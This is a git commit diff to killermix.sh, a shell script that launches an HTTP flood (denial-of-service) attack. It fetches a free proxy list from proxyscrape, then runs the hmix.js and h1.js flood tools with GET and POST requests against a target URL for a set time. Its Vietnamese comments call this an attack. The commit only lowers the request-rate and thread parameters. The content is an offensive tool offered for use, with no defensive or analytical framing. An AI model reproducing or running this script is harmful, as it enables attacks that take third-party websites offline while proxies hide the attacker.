2f2c0daad13f7a419f36271993e773174bf21ff2
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-13 08:32:44 +0700

    hehe

--- killermix.sh
+++ killermix.sh
@@ -7,18 +7,18 @@ URL=$1
 TIME=$2
 
 # Tải proxy HTTP thẳng vào live.txt
-curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=2000" > live.txt
+curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=1000" > live.txt
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
 # Chạy tấn công với hmix.js
 for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 999 --full true -d false &
+  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 48 --full true -d false &
 done
 
 # Chạy tấn công với h1.js
 for method in GET POST; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 999 24 randomstring=true &
+  node h1.js "$method" "$URL" live.txt "$TIME" 48 10 randomstring=true &
 done
 wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
